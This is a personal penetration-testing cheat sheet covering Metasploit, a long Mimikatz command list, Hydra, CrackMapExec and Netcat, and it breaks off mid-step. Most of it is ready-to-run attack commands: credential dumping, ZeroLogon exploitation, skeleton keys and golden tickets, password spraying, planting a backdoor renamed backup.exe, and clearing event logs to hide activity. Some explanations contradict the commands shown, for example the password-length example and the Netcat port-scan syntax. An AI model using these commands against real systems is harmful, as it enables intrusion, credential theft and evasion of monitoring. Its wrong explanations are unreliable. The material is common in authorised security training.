
>This note is intended strictly for educational and ethical use only. Any misuse or unauthorized activity is strongly discouraged and not supported.

<!--
>I share this note to help others learn about cybersecurity in a responsible way. Please use them ethically and only on systems you’re authorized to test.
-->

## Enumeration

### enum4linux

Example target: `192.168.1.10`

```sh
enum4linux -a 192.168.1.10
```

| Option | Description                                         |
| ------ | --------------------------------------------------- |
| `-a`   | Do **all** available checks (recommended for recon) |
| `-U`   | Enumerate **users**                                 |
| `-S`   | Enumerate **shares**                                |
| `-G`   | Enumerate **groups**                                |
| `-P`   | Enumerate **password policy**                       |
| `-r`   | Enumerate **RID cycling** for users/groups          |
| `-o`   | Enumerate **OS information**                        |
| `-h`   | Show **help**                                       |


### Nmap

See nmap.md

### Metasploit

Start PostgreSQL:
```sh
sudo service postgresql start
```

Check PostgreSQL setatus:
```sh
service postgresql status
```

Start msfconsole:
```sh
msfconsole
```

Check database connection in msfonsole:
```sh
db_status
```


#### Metasploit modules

Metasploit modules are primarily stored in `/usr/share/metasploit-framework/modules`:

```sh
ls /usr/share/metasploit-framework/modules 
```

The output of the command above:
```sh
auxiliary  encoders  evasion  exploits  nops  payloads  post  README.md
```

According to [Metasploit Unleashed](https://www.offsec.com/metasploit-unleashed/modules-and-locations/):
1. `auxilary`: module that includes port scanners, fuzzers, sniffers
2. `exploits`: module that uses payloads
3. `payloads`: module that consists of code that runs remotely
4. `encoders`: module that ensures that payloads make it to their destination intact
5. `nops`: module that keep the payload sizes consistent across exploit attempts


#### Search for modules

The following is some examples of search to find specific modules:

1. Searching fot `auxiliary` modules related to `smb`:

```sh
search type:auxiliary name:smb
```

2. Searching for exploits related to CVEs found in 2009:
```sh
search cve:2009 type:exploit
```

Want to see the ones specific to Linux?
```sh
search cve:2009 type:exploit platform:-linux
```

3. Searching for modules (not just exploits) related to CVEs found in 2009, sorted by their names
```sh
search cve:2009 -s name
```


#### Create a workspace in Metasploit

By default, the workspace is `default`. It is recommended to create a workspace per project.

Create a workspace:
```sh
workspace -a smb_enum
```
msfconsole will switch to the created workspace immediately.

#### Import an Nmap scan into Metasploit

Let's say you saved Nmap output with a command such as `nmap <target> -oA scanresult`. 

One of the output is an XML file which can be imported into Metasploit:
```sh
db_import scanresult.xml
```

Note: You can also import other files such as Nessus scan reports.
For more details, check:
```sh
db_import
```

Next, you can check:
```sh
hosts
```

See services in the scan output:
```sh
services
```

#### Running Nmap in Metasploit

```sh
db_nmap 192.168.1.10
```

One can also use a variety of options when running Nmap in Metasploit:
```sh
db_nmap -Pn -sV -sO -sC -p- 192.168.1.10
```

#### Metasploit plugins

See available Metasploit plugins:
```sh
load -l
```

Metasploit plugins are available in `/usr/share/metasploit-framework/plugins`:
```sh
ls /usr/share/metasploit-framework/plugins
```


##### Adding a Metasploit plugin

Let's add the [`metasploit-autopwn`](https://github.com/hahwul/metasploit-autopwn) plugin!

1. Clone the repository

```sh
git clone https://github.com/hahwul/metasploit-autopwn
```

2. Copy `db_autopwn.rb` into the Metasploit plugins directory

```sh
cp db_auopwn.rb /usr/share/metasploit-framework/plugins/
```

If it does not work, try:
```sh
sudo cp db_autopwn.rb /usr/share/metasploit/framework/plugins/
```

3. Start Metasploit and load the plugin

```sh
msfconsole
```

```sh
msf6 > load db_autopwn 
```

```sh
msf6 > db_autopwn -h
```

##### Kiwi - A Metasploit plugin

Kiwi is an extension/a plugin that grabs credentials from Windows memory.

In order to use Kiwi, one should load it in msfconsole:
```sh
load kiwi
```

There are some methods in Kiwi to dump credentials, some of them are:

```sh
creds_all
```

```sh
creds_kerberos
```

Reference: [Methods in Kiwi](https://docs.metasploit.com/api/Rex/Post/Meterpreter/Extensions/Kiwi/Kiwi.html#creds_all-instance_method)


If you want to run Kiwi on a Windows machine (typically after getting access to one), you can upload the executable via *meterpreter* :

```sh
upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe
```

Or if the target machine has a 32-bit architecture:
```sh
upload /usr/share/windows-resources/mimikatz/x86/mimikatz.exe
```

##### Kiwi - in Windows

###### Mimikatz - Powershell
```sh
PS C:\temp\mimikatz> .\mimikatz "privilege::debug" "sekurlsa::logonpasswords" exit
```

###### Mimikatz console

Display Mimikatz version along with additional information about the Windows sytem:
```
mimikatz # version
```

Get debug rights
```
mimikatz # privilege::debug
```
Note: By default, the Administrators group already has debug rights. You just need to turn them on by running privilege::debug.


List all available provider credentials (more often than not, this shows recently logged on user and computer credentials)
```
mimikatz # sekurlsa::logonpasswords
```

Clear a specified event log (default: `SECURITY`):
```
mimikatz # event::clear
```
Note: `/log` is an argument for this command. It specifies the log to clear.

For example, clearing `SYSTEM` log:
```
mimikatz # event::clear /log:System
```


(experimental) possibly patch event services so new events don’t get logged:
```
mimikatz # event::drop
```

Note: run this in order `privilege::debug` -> `event::drop` -> `event::clear`


Request TGS tickets:
```
mimikatz # kerberos::ask
```

List tickets in MIT/Heimdall cache:
```
kerberos::clist
```

List all user tickets in user memory:
```
kerberos::list
```

Exports user tickers to files:
```
kerberos::list /export
```

Purge all Kerberos tickets:
```
kerberos::purge
```

Get current TGT for current user:
```
kerberos::tgt
```

```
lsadump::backupkeys
```

Ask LSA server to pull credentials from SAM/active directory:
```
lsadump::lsa
```

Ask a domain controller to synchronize an object (get password data for account) without running code on DC:
```
lsadump::dcsync
```

Get the SysKey to decrypt SAM entries from registry/hive and dump all local credentials on a Windows computer:
```
lsadump::sam
```

Ask LSA Server to retrieve Trust Auth Information in order to dump trust keys (passwords) for all associated trusts (domain/forest)
```
lsadump::trust
```

Add SIDHistory to user account:
```
misc::addsid
```

Inject a malicious WindowsSSP to log locally authenticated credentials:
```
misc::memssp
```

Get preferred backup master keys:
```
sekurlsa::backupkeys
```

List credential manager:
```
sekurlsa::credman
```

List cached masterkeys:
```
sekurlsa::dpapi
```

List DPAPI_SYSTEM secret:
```
sekurlsa::dpapiSystem
```

DPAPI = Data Protection API

It's a Windows feature that encrypts secrets such as:
- Browser passwords
- Wi-Fi passwords
- Credential Manager entries
- Private keys
- RDP saved credentials
- Some application secrets


List Kerberos encryption keys:
```
sekurlsa::ekeys
```

List Kerberos credentials for all authenticated users (including services and computer accounts):
```
sekurlsa::kerberos
```

Get domain kerberos service account (KRBTGT) password data:
```
sekurlsa::krbtgt
```

List LiveSSP credentials:
```
sekurlsa::liveSSP
```

[One of the most powerful commands in Mimikatz]
List all available provider credentials (usually shows recently logged on users and computer credentials):
```
sekulrsa::logonpasswords
```

Pass- theHash and Over-Pass-the-Hash:
```
sekurlsa::pth
```

(Need to verify this) Switch to LSASS minidump process context:
```
sekurlsa::minidump c:\tmp\lsass.dmp
```

List LM and NTLM credentials:
```
sekurlsa::msv
```

Switches to LSASS process context:
```
sekurlsa::process
```

Lists WDigest credentials:
```
sekurlsa::wdigest
```

Note: WDigest = an authentication method that historically exposed cleartext passwords in memory.


Lists/exports certificates:
```
crypto::certificates
```

Creates golden/silver/trust tickets:
```
kerberos::golden
```

Passes the ticket (commonly used to inject a stolen Kerberos ticket):
```
kerberos::ptt
```

Injects skeleton key into lsass process on domain controller:
```
misc::skeleton
```

Lists all available Kerberos tickets for all recently authenticated users:
```
sekurlsa::tickets
```

Lists all tokens of the system:
```
token::list
```

Impersonate a token, in order to elevate permissions to SYSTEM (default):
```
token::elevate
```

Impersonate a token with domain admin credentials:
```
token::elevate /domainadmin
```

Hash a password with optional username:
```
crypto::hash
```
Refer here for the usage: https://adsecurity.org/?page_id=1821#SID

List cryptographic providers:
```
crypto::providers
```

Hash password to keys:
```
kerberos::hash
```

Passes the cache (NT6):
```
kerberos::ptc
```

Retrieves the Syskey to decrypt NL$KM then MSCache(v2) from registry or hives (requires Administrator rights):
```
lsadump::cache
```

Impersonate a domain controller via a silver ticket:
```
lsadump::netsync
```

Ask a server to set a new password/ntlm for a user:
```
lsadump::setntlm
```

Dump LSA secrets from the registries:
```
lsadump::secret
```

Detect and exploit ZeroLogon vulnerability:
```
lsadump::zerologon
```
Example usage:
(1) Detecting Zerologon:
```
# lsadump::zerologon /target:<the target domain controller FQDN> /account:<the target DC SamAccountName>
lsadump::zerologon /target:dc1.sparksec.local /account:dc$
```

(2) Exploiting Zerologon (just add `/exploit` at the end):
```
lsadump::zerologon /target:dc1.sparksec.local /account:dc$ /exploit
```

Remotely update a domain password and the local stored password, similar to using `netdom resetpwd`:
```
lsadump::postzerologon /target:192.168.1.10 /account:dc$
```


(experimental) patch the cryptoAPI layer to export data more easily:
```
crypto::capi
```
Note: CryptoAPI is Windows' legacy cryptography framework


Try to export a software CA into crypto (virtual) hardware:
```
crypto::certtohw
```

(experimental) Patch the CNG service to make key export easier (targets the KeyIso service):
```
crypto::cng
```
Note:
- CNG (Cryptography Next Generation) is Windows’ modern cryptography system (replacement for the older CryptoAPI (CAPI) system) that handles things like encryption, decryption, hashing, and digital signatures 
- KeyIso (short for Key Isolation) is a Windows service that protects cryptographic keys


(experimental) Extract keys from CAPI RSA/AES providers:
```
crypto::extract
```
Note:
- RSA is an asymmetric encryption algorithm (typically used for key exchange, certificates, digital signatures)
- AES is a symmetric encryption algorithm (typically used for encrypting files, protecting session data, and data encryption)


View or export stored cryptographic keys:
```
crypto::keys
```

List cryptographic stores:
```
crypto:stores
```
Note: it has one argument: `/systemstore` which specifies which system store to list (default: `CERT_SYSTEM_STORE_CURRENT_USER`)

For example:
```
crypto::stores /systemstore:local_machine
```
You can also set /systemstore to one of the options listed [here](https://adsecurity.org/?page_id=1821#CRYPTO)


Displays details for Microsoft’s TPM crypto provider:
```
crypto::tpminfo
```

List smart card or token readers connected to the system (including remote ones):
```
crypto::sc
```
Note: If a CSP (Cryptographic Service Provider) is available, it also tries to list the keys stored on the smart card.


Show the credential cache from the DPAPI module:
```
dpapi::cache
```

Dump Azure credentials from this registry location (`HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\AAD\Storage`)
```
dpapi::cloudapreg
```

Get OpenSSH private keys:
```
dpapi::ssh
```
Note:
You can use it with this argument to reveal the decryption result on the screen: `/unprotect`:
```
dpapi::ssh /unprotect
```

Launch registry editor (regedit):
```
misc::regedit
```

Launch command prompt:
```
misc::cmd
```

Launch task manager:
```
misc:: taskmgr
```

Monitor clipboard:
```
misc::clip
```

Compress Mimikatz itself (e.g.: `mimikatz.exe`):
```
misc::compress
```

Show detailed info about local group memberships, including Remote Desktop Users, Distributed COM Users, and more:
```
net::alias
```

Display the local groups:
```
net::group
```

Show the available local IP addresses and the hostname:
```
net::if
```

Get information about the logged in server:
```
net::serverinfo
```

Display active sessions:
(1) using `NetSessionEnum()` Win32 API:
```
net::session
```

(2) using `NetWkstaUserEnum()` Win32 API:
```
net::wsession
```


Show when the target was booted:
```
net::stats
```

Display the current time:
```
net::tod
```

Shows information about Active Directory forest trust(s):
```
net::trust
```


###### LSA protection against Mimikatz

> What is LSA?

The LSA (which includes the LSASS process) is responsible for checking user logins (both local and remote) and enforcing security rules on the system.

Starting with Windows 8.1, Windows adds extra protection to LSA so untrusted processes can’t read its memory or inject code. This helps keep the credentials that LSA stores much more secure.
Windows Server 2012 R2 and Windows 8.1 introduce a feature called LSA Protection. It runs LSASS as a protected process, making it much harder to tamper with. Tools like Mimikatz can still bypass this by loading a driver, but that usually leaves clear traces in the event logs.


Option 1: Using the Registry
1. Open Registry Editor (regedit.exe)
2. Go to: `KEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa`
3. Set the registry value: `“RunAsPPL”=dword:00000001`

Option 2: Using Group Policy (GPO)
1. Create a new GPO
2. Go to: `Computer Configuration → Preferences → Windows Settings`
3. Right-click Registry → New → Registry Item
4. Click `HKEY_LOCAL_MACHINE`
5. In the key path list, browse `SYSTEM\CurrentControlSet\Control\Lsa`
6. In the value name box, type `RunAsPPL`
7. In the value type box, click `REG_DWORD`
8. In the value data box, type `00000001`
5. Click `OK`

What this does:
LSA Protection blocks unprotected processes from talking to LSASS. However, tools like Mimikatz can still get around this by loading a driver (!+).


Mimikatz references: 
- [Unofficial Guide to Mimikatz & Command Reference](https://adsecurity.org/?page_id=1821)
- [Mimikatz cheatsheet](https://happycamper84.medium.com/mimikatz-cheatsheet-ad2b88059b4)
- [Mimikatz - The Hacker Tools](https://tools.thehacker.recipes/mimikatz/)


#### Putting Metasploit in background

(1)
- Press `Ctrl + z`, then you'll see normal terminal.
- Run `fg` in terminal to return to the existing process/session

(2)
- In meterpreter session, type `bg` then type `y` to confirm putting the session in the background.
- Run `sessions` in Metasploit to list existing sessions.
- Type `sessions -i <session ID>` to enter session, such as `sessions -i 1` to enter session 1.


#### Pivoting in Metasploit

(To-do: complete this)

According to [Rapid7 - Metasploit Pivoting](https://docs.metasploit.com/docs/using-metasploit/intermediate/pivoting-in-metasploit.html), there's a couple of ways to register routes:

1. `AutoRoute` (automated)
2. `Route` (more of a manual method)

For instance, we have 3 machines:

1. Kali Machine
Internal: None
External: ???
2. Target 1 (used as pivot)
Internal: 10.2.27.1
External: ???
3. Target 2 (final target)
Internal: 10.2.27.187
External: None

##### `AutoRoute`:

1. Scan the target machine
Start by scanning the reachable target machine to identify any vulnerable services. In this case, we're looking for the HTTPFileServer service.

2. Find an exploit for the vulnerable service
Search for an exploit for the identified service. You can use tools like searchsploit or search directly within Metasploit’s msfconsole by typing `search <service_name>`.

3. Run the exploit
Most exploits are available in Metasploit. Load the exploit, configure it, and run it to gain access to the first target machine (let's call it Target 1).

4. Check network connections on Target 1
Once you have access, run ifconfig on Target 1 to display its network interfaces. Look for the interface that shares the same subnet as the second target (Target 2), which is your real goal.

5. Set up a route to Target 2
Use the autoroute module to add a route to Target 2’s network.

Command: `run autoroute -s <Network Address>/<Subnet Mask>`

Example: `run autoroute -s 10.2.27.0/20`

6. Scan for open ports on Target 2
Put the current session in the background with bg. Then, search for the portscan module in Metasploit using search portscan. Run the TCP portscan module to identify open ports on Target 2.

7. Return to the session
Go back to the session for Target 1 by typing `sessions -i 1`.

8. Set up port forwarding
Configure port forwarding to route traffic from your machine to Target 2 through Target 1.

Command: `portfwd -l <attacker’s port> -p <Target 2’s open port> -r <Target 2’s IP>`

Example: `portfwd -l 1234 -p 80 -r 10.2.27.187`

9. Background the session again
Put the Target 1 session back in the background with `bg`.

10. Run Nmap within Metasploit
Use Metasploit’s db_nmap to scan Target 2 through the forwarded port.

Command: `db_nmap -sS -sV -p <attacker’s port> localhost`

Example: `db_nmap -sS -sV -p 1234 localhost`

11. Identify vulnerable services on Target 2
From the scan results, look for any vulnerable services. In this case, let’s say it’s the BadBlue service.

12. Search for exploits for the vulnerable service
Look for exploits for the identified service (e.g., BadBlue). Use searchsploit or Metasploit’s search command.

**Tip**: Check the service’s version to ensure the exploit matches.

13. Configure and run the exploit
Load the exploit in Metasploit, configure its options, and run it. Pay attention to:
- RHOSTS: Set this to Target 2’s IP address.
- LPORT: Change the default (e.g., `4444`) to something like `4433`.
- RPORT: Ensure this matches the open port on Target 2 (e.g., 80 for BadBlue).

14. Gain access to Target 2
If the exploit works, you should now have access to Target 2!

15. Rename the session
For clarity, rename the session to something meaningful, like `session -n target2`.

#### Clearing logs in Meterpreter

This will clear the Application, System, and Security logs on a Windows system:
```sh
meterpreter > clearev
```


### SSH

```sh
ssh root@192.168.10
```

If there's a private key:
```sh
ssh -i id_rsa root@192.168.1.10
```

### Dig (DNS)

The default command format:
```
dig [server] [name] [type]
```

Examples:
```
dig 192.168.1.10
```

```
dig google.com
```

Need IP adddress(es), but overwhelmed with the output? Try:
```
dig google.com +short
```

You may see certain DNS records, such as A record(s). In order to see all query results:
```
dig google.com ANY
```

If you want to search for a specific record type:
```
# Search for A record(s)
dig google.com A
```

```
# Search for MX record(s)
dig google.com MX
```

```
# Get the MX records only
dig google.com MX +short
```

```
# Query the nameserver(s)
dig google.com NS
```

```
# Only dump the nameservers
dig google.com NS +short
```

Specify DNS server:
```
dig @1.1.1.1 google.com
```

```
dig @8.8.8.8 google.com
```

Reverse DNS check (IP address to hostname):
```
# Example: dig -x 10.110.21.41
dig -x <IP address>
```


#### References (Dig):
- (pheonixnap - dig command in Linux with examples)[https://phoenixnap.com/kb/linux-dig-command-examples]


### FTP

```sh
ftp 192.168.1.10
```


### SMBclient

```sh
smbclient -L //192.168.1.10 -N
```

| Option       | Description                 |
| ------------ | --------------------------- |
| `-L //<IP>`  | List available shares       |
| `-U <user>`  | Username                    |
| `-N`         | No password (guest access)  |
| `//<IP>/share` | Connect to a specific share |


### LinEnum

```sh
./LinEnum.sh -s -k keyword -r report -e /tmp/ -t
```

| **Option** | **Description**                                                                  | **Example Command**                   |
| ---------- | -------------------------------------------------------------------------------- | ------------------------------------- |
| `-k`   | Enter **keyword** to search for during enumeration (e.g., "sudo", "password").   | `./LinEnum.sh -k "sudo"`              |
| `-e`   | Enter **export location** to save the output report.                             | `./LinEnum.sh -e /path/to/output/dir` |
| `-t`   | Include **thorough (lengthy) tests** to provide more detailed results.           | `./LinEnum.sh -t`                     |
| `-s`   | Supply **current user password** to check sudo permissions (INSECURE).           | `./LinEnum.sh -s password123`         |
| `-r`   | Enter **report name** to save the output as a specific file name (e.g., `.txt`). | `./LinEnum.sh -r linenum_report`      |
| `-h`   | Display this help text with all available options.                           | `./LinEnum.sh -h`                     |


### LDAPsearch

```sh
ldapsearch -x -h <IP> -s base
```

| Option | Description                            |
| ------ | -------------------------------------- |
| `-x`   | Simple authentication                  |
| `-h`   | LDAP server IP                         |
| `-b`   | Base DN (e.g., `dc=example,dc=com`)    |
| `-s`   | Search scope (`base`, `one`, or `sub`) |


### RPCclient

```sh
rpcclient -U "" <target>
```

| Option  | Description                   |
| ------- | ----------------------------- |
| `-U ""` | Anonymous login               |
| `-c`    | Run commands inside the shell |

Useful commands:

```sh
rpcclient $> enumdomusers
```

```sh
rpcclient $> queryuser <RID>
```

```sh
rpcclient $> netshareenum
```


### NMB Lookup

```sh
nmblookup -A 192.168.1.10
```

| Option  | Description                   |
| ------- | ----------------------------- |
| `-A <IP Address>` | lookup by IP to connect to a server’s NetBIOS info and list server connection information              |


### Hydra

```sh
hydra <flags> <IP_Address> <protocol>
```

| Option  | Description                   |
| ------- | ----------------------------- |
| `-l <username>` | login name |
| `-P <path/to/file>` | path to password wordlist |
| `-L <path/to/file>` | login username wordlist |

In other words (and for example):
```sh
# hydra -l <username> -p <password> <target> <service>
hydra -l admin -p pass123 192.168.1.10 smb
```
or
```sh
# hydra -l <username> -p <password> <service>://<target>
hydra -l admin -p pass123 smb://192.168.1.10
```


The following will try to login to the SMB server at the IP address with the username admin trying passwords found in the rockyou txt file:
```sh
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.10 smb
```

If you want to verbose the output, you can include `-V`:
```sh
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.10 smb -V
```

If you want to run it in debug mode, use the `-d` flag:
```sh
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.10 smb -d
```

If you want Hydra to stop as soon as it discovers the first valid username and password combination, you can use `-F` option:
```sh
hydra -L usernames.txt -P /usr/share/wordlists/rockyou.txt 192.168.1.10 smb -F
```

To check for three trivial passwords, you can use the `-e nsr` option:
```sh
hydra -L usernames.txt -P /usr/share/wordlists/rockyou.txt 192.168.1.10 smb -e nsr 
```
note:
- `n` tells Hydra to test for accounts with no password
- `s` tests if users reused their own username as the password.
- `r` attempts to log in with the username flipped backwards.


If your Hydra session stops unexpectedly, you can restart it with the `-R` option (thanks to Hydra’s built-in resume capability):
```sh
hydra -R
```
(Valid only when one or more prior Hydra commands were interrupted before completing though)

Generating passwords of a certain format on the fly:
```sh
# hydra [-l <username> or -L <usernames list>] [-p <password> or -P <password list>] -x <min>:<max>:<charset> <target> <service>
hydra -L usernames.txt -P /usr/share/wordlists/rockyou.txt -x 8:12:a1#$ 192.168.1.10 smb
```

For instance:
```sh
8:12:a1#$
```
means:
- Generate passwords that are between 5 and 7 characters long
- Use lowercase letters (a–z)
- Include numbers (0–9)
- Allow any number of # and $ characters (meaning these symbols can appear multiple times or not at all in the generated passwords)


If you want to save the output to a file:
```sh
# hydra -L <username list file> -P <password list file> <target> <service> -o <output filename>
hydra -L usernames.txt -P /usr/share/rockyou.txt 192.168.1.10 smb -o hydra_smb_output
```

FTP:
```sh
hydra -t 4 -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/wordlists/rockyou.txt -v 192.168.1.10 ftp
```

or if you target a domain:
```sh
hydra -t 4 -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/wordlists/rockyou.txt -v demo.exampledomain.net ftp
```


SSH:
```sh
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/wordlists/rockyou.txt 192.168.1.10 ssh
```


If you already know some username and password combinations on your server, you can list them in a separate text file—one per line in the format `username:password`. Then, you can use `-C` (combo entries):
```sh
# hydra -C <username and password pairing file> <target> <service>
hydra -C userpass.txt 192.168.1.10 smb
```

If you have multiple targets at once, store their IP addresses in a file and apply the -M option:
```sh
# hydra -l <admin> -p <password> -M <IP addresses of targets> <service>
hydra -l admin -p pass123 -M targetIPs.txt smb
```

Note: you can replace [`-l admin -p pass123`] above with several options, such as:
```sh
hydra -l admin -P /usr/share/rockyou.txt -M targetIPs.txt smb
```
and
```sh
hydra -L usernames.txt -P /usr/share/rockyou.txt -M targetIPs.txt smb
```

If you know a service is not running on a non-default port (e.g.: rdp running on port 3333 instead of port 3389), you can use options `-s`:
```sh
# hydra -L <username list file> -P <password list file> <target> -s <non-default port of the target service> <service>
hydra -L usernames.txt -P /usr/share/rockyou.txt 192.168.1.10 -s 3333 rdp
```

Hydra operates on the CPU and supports multithreading, allowing it to test several login attempts at once. You can use the `-t` option to increase the speed of your password cracking (By default, Hydra uses **16 threads**) :
```sh
# hydra -L <username list file> -P <password list file> <target> -t <number of threads> <service>
hydra -L usernames.txt -P /usr/share/rockyou.txt 192.168.1.10 -t 4 smb
```

To find out which parameters apply to a service Hydra supports, run this command:
```sh
# hydra <service> -U
hydra smb -U
```

Performing a bruteforce attack on a web login:
Format:
```sh
# hydra [-l <username> or -L <username list>] [-p <password> or -P <password list>] <website URL> http-post-form "path/to/web/login/index.php:userField=^USER^:passField=^PASS^"
```

Example:
```sh
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/rockyou.txt 127.0.0.1 http-post-form "/DVWA/vulnerabilities/brute/index.php:userField=^USER^:passField=^PASS^"
```
Note: you don't need to replace this `userField=^USER^:passField=^PASS^` in the command above.

That extra argument at the end is just the part of the URL after the server name/IP. For how to make it, try the command below:
```sh
hydra http-post-form -U
```

Reference: [Hydra - Stationx](https://www.stationx.net/how-to-use-hydra/)


### Crackmapexec

Crackmapexec is a useful tool in Windows active directory environment that automates activities such as advanced password attacks and post-exploitation attacks
(Reference: [stationx](https://www.stationx.net/crackmapexec-cheat-sheet/))

Examples:
```sh
# crackmapexec <service> <target>
crackmapexec smb 192.168.1.10
```

[Needs Verification] Try a combination of a username and a password (no bruteforce):
```sh
# crackmapexec <service> -u <username> -p <password> --no-bruteforce <target>
crackmapexec smb -u admin -p pass123 --no-bruteforce 192.168.1.10
```

#### Crackmapexec - SMB

```sh
# crackmapexec <service> <target> -u <USERNAME> -p <PASSWORD> --users
crackmapexec smb 192.168.1.10 -u admin -p pass123 --users 
```

```sh
crackmapexec smb 192.168.1.10 -u admin -p pass123 --groups
```

```sh
crackmapexec smb 192.168.1.10 -u admin -p pass123 --shares
```

```sh
crackmapexec smb 192.168.1.10 -u admin -p pass123 --computers
```

```sh
crackmapexec smb 192.168.1.10 -u admin -p pass123 --sessions
```

#### Crackmapexec - Password Spraying attack

```sh
# crackmapexec <service> -u <username> -p <password> <target>
crackmapexec smb -u admin -p /usr/share/wordlists/rockyou.txt 192.168.1.10
crackmapexec winrm -u admin -p /usr/share/wordlists/rockyou.txt 192.168.1.10
```

#### Crackmapexec - Credential Harvesting

- Identifies the port that the service is running on (if it's not running on its standard port)
```sh
# crackmapexec <service> -u <username> -p <password> --port <port> <target>
crackmapexec smb -u admin -p pass123 --port 445 192.168.1.10
```

- Grab SAM hashes from the target system after successful login
```sh
# crackmapexec <smb or winrm> -u <username> -p <password> --sam <target>
crackmapexec smb  -u admin -p pass123 --sam 192.168.1.10
```

- Dump LSA secrets from the target system after successful login
```sh
# crackmapexec <smb or winrm> -u <username> -p <password> --lsa <target>
crackmapexec smb -u admin -p pass123 --lsa 192.168.1.10
```

- Find local administrator accounts across machines
```sh
# crackmapexec <smb or winrm> -u <username> -p <password> -x 'net localgroup administrators' <target>
crackmapexec smb -u admin -p pass123 -x 'net localgroup administrators' 192.168.1.10
```

- [Needs verification] Get NTDS.dit from the target domain controller (uses drsupai by default)
```sh
# crackmapexec smb -u <username> -p <password> --ntds [vss,drsupai] <target>
crackmapexec smb -u admin -p pass123 --ntds drsupai 192.168.1.10
```


#### Crackmapexec - Gaining Access and Lateral Movement

- Execute a command on the target machine
```sh
# crackmapexec <smb or winrm> -u <username> -p <password> -x <command> <target>
crackmapexec smb -u admin -p pass123 -x ipconfig 192.168.1.10
```

- [Kerberoasting] Get a Ticket Granting System (TGS) ticket which can be cracked using Hashcat
```sh
# crackmapexec ldap -u <username> -p <password> --kerberoasting <target>
crackmapexec ldap -u admin -p pass123 --kerberoasting 192.168.1.10
```

- [AS REP roasting] Get AS REP response ready to crack with Hashcat to carry out ASREP-roasting
```sh
# crackmapexec ldap -u <username> -p <password> --asreproast <target>
crackmapexec ldap -u admin -p pass123 --asreproast 192.168.1.10
```

#### Crackmapexec - Post-Exploitation

- Enable RDP on a target machine after a successful login attempt
```sh
# crackmapexec smb -u <username> -p <password> -M rdp
crackmapexec smb -u admin -p pass123 -M rdp
```

- List tokens the attacker can impersonate on the target machine, in order to escalate their privileges
```sh
# crackmapexec smb -u <username> -p <password> -M impersonate
crackmapexec smb -u admin -p pass123 -M impersonate
```

- Search for files with `AlwaysInstallElevated` attribute that can be used to escalate one's privileges
```sh
# crackmapexec smb -u <username> -p <password> -M install_elevated
crackmapexec smb -u admin -p pass123 -M install_elevated
```

- Gather all antivirus installed on a target machine
```sh
# crackmapexec smb -u <username> -p <password> -M enum-avproducts
crackmapexec smb -u admin -p pass123 -M enum-avproducts
```

- Dump DNS from the active directory DNS server using WMI
```sh
# crackmapexec smb -u <username> -p <password> -M enum_dns
crackmapexec smb -u admin -p pass123 -M enum_dns
```

- Get a target machine's current network connections using WMI
```sh
# crackmapexec smb -u <username> -p <password> -M get_netconnections
crackmapexec smb -u admin -p pass123 -M get_netconnections
```

- Check for KeePass-related files that potentially contain credentials
```sh
# crackmapexec smb -u <username> -p <password> -M keepass_discover
crackmapexec smb -u admin -p pass123 -M keepass_discover
```

- Upload a local file onto a target machine
```sh
# crackmapexec smb -u <username> -p <password> --put-file <file in local machine> <path in target machine>
crackmapexec smb -u admin -p pass123 --put-file msfvenom_backdoor.exe C:\Windows\Temp\backup.exe
```

- Get a file from a target machine
```sh
# crackmapexec smb -u <username> -p <password> --get-file <file in remote machine> <path in local machine>
crackmapexec smb -u admin -p pass123 --get-file C:\Windows\User\Desktop\credentials.txt creds.txt 
```

- Get information about Active Directory environment
```sh
# crackmapexec ldap -u <username> -p <password> -M get-network
crackmapexec ldap -u admin -p pass123 -M get-network
```

- Grab Windows Local Administrator Password Solution (LAPS) passwords
```sh
# crackmapexec ldap -u <username> -p <password> -M laps
crackmapexec ldap -u admin -p pass123 -M laps
```

- Automatically enumerate and exploit MS SQL privileges
```sh
# crackmapexec mssql -u <username> -p <password> -M mssql_priv
crackmapexec mssql -u admin -p pass123 -M mssql_priv
```

- Crackmapexec reference: [stationx - crackmapexec](https://www.stationx.net/crackmapexec-cheat-sheet/)


### Directory Buster

Enumerate directories of a website from a wordlist

#### dirb

```sh
dirb example.com ~/SecList/wordlists/Discovery/Web-Content/common.txt
```

#### gobuster

Examples:
```sh
gobuster dir -u example.com -w ~/SecList/wordlists/Discovery/Web-Content/common.txt
```

```sh
gobuster dir -u 10.10.35.63 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt
```


### Networking

#### Linux

```sh
ip route
```

#### Windows

```sh
route print
```

#### Mac OS X/Linux

```sh
netstat -r
```

### Information Gathering (Passive)

Help enumerate website information

```sh
whatweb 192.168.1.10
```

```sh
host example.com
```

#### DNS

```sh
whois example.com
whois 192.168.1.10
```

Note: Be careful using dnsenum. It carries out bruteforce by default.

```sh
dnsenum example.com
```

### Netcat (nc)

Netcat is a utility tool that reads and writes data across network connections (source: [Netcat homepage](https://netcat.sourceforge.net/))

```sh
nc 10.4.20.244
```

Frequently used Netcat options/parameters:
`-n`: Avoid DNS resolution
`-v`: Verbose output
`-l`: listening (on a port)
`-p`: specifying the port

```sh
# Frequently used
nc -nv 10.4.20.244 1234

# Not that used much (separating options)
nc -n -v 10.4.20.244 1234
```

#### Port scanning using Netcat

```sh
# HTTP
nc -nvlp 10.4.20.244 80
```

```sh
# FTP
nc -nvlp 10.4.20.244 21
```

```sh
# SSH
nc -nvlp 10.4.20.244 22
```

```sh
# SMB
nc -nvlp 10.4.20.244 445
```
etc.

#### Transferring Netcat from Kali Linux to Windows

Scenario: 
Suppose we're connecting machine A (Kali) and machine B (Windows).
- Kali Linux IP: 192.168.1.45
- Windows IP: 192.168.1.33

Background:
Netcat is pre-installed in Kali Linux, but not in Windows. Fortunately, Kali Linux comes with Netcat executable (`nc.exe`)

1. In Kali, we need to locate where `nc.exe` is:
```sh
locate nc.exe
```

2. Copy `nc.exe` to the current directory:
```sh
cp /usr/windows-resources/nc.exe .
```

3. In the directory you copied `nc.exe` to, run Python server to host the file:
```sh
python -m SimpleHTTPServer 80
```

4. Go to Windows and open CommandPrompt (cmd) to execute this:
```sh
